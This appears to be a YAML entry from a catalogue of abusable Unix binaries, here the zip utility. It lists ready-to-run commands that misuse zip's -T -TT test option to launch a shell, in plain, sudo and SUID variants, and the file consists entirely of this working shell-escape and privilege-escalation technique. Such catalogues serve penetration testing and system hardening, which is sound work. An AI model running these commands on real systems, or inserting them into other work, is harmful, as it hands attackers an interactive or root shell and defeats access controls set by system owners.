---
functions:
  execute-interactive:
    - code: |
        zip /tmp/x.zip /etc/hosts -T -TT 'sh #'
        rm /tmp/x.zip
  sudo-enabled:
    - code: |
        sudo zip /tmp/x.zip /etc/hosts -T -TT 'sh #'
        sudo rm /tmp/x.zip
  suid-limited:
    - code: |
        ./zip /tmp/x.zip /etc/hosts -T -TT 'sh #'
        sudo rm /tmp/x.zip
---
